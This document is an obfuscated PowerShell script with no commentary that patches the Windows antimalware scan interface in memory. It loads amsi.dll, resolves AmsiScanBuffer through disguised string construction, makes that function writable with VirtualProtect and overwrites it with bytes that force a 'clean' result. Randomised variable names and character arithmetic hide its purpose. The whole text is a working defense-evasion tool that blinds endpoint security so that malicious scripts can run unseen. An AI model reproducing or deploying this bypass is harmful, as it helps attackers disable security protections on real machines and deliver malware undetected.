$K9dm = @"
using System;
using System.Runtime.InteropServices;
public class K9dm {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr nxuFa8kingOVmWhWQe, string DdjaVWkiSCzSJa);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr hm5qHNpGNkWE, UIntPtr qbWQCn9, uint GI2tZfpZenHZVk3, out uint iLeBYiQBr6);
}
"@

Add-Type $K9dm

$_6hZcIt4J = [K9dm]::LoadLibrary("$([cHAr](55+42)+[CHAr](109)+[cHar](115+35-35)+[CHar]([BYTE]0x69)+[cHaR](46)+[chaR](100+70-70)+[ChAr]([BYTE]0x6c)+[chAr](108+106-106))")
$l6azsIGbeT = [K9dm]::GetProcAddress($_6hZcIt4J, "$(('ÂmsîScâ'+'nBùffêr').NorMaLIZE([CHAR](70*15/15)+[char]([bYTE]0x6f)+[chAR]([bYte]0x72)+[Char]([bytE]0x6d)+[chaR]([bYte]0x44)) -replace [cHaR]([BYte]0x5c)+[ChAr](112*76/76)+[ChAr]([byTe]0x7b)+[CHar](12+65)+[chAr](110+28-28)+[chAr]([Byte]0x7d))")
$p = 0
[K9dm]::VirtualProtect($l6azsIGbeT, [uint32]5, 0x40, [ref]$p)
$qfTRZtMwgO7vXJm = "0xB8"
$ZMXHRQ5IR5_sKN24rZ = "0x57"
$hDJy0AroUGRSSVx = "0x00"
$CNBohU = "0x07"
$IBULW = "0x80"
$Ddpz5lKBtoFthnicc = "0xC3"
$awyjDELQ_X5T = [Byte[]] ($qfTRZtMwgO7vXJm,$ZMXHRQ5IR5_sKN24rZ,$hDJy0AroUGRSSVx,$CNBohU,+$IBULW,+$Ddpz5lKBtoFthnicc)
[System.Runtime.InteropServices.Marshal]::Copy($awyjDELQ_X5T, 0, $l6azsIGbeT, 6)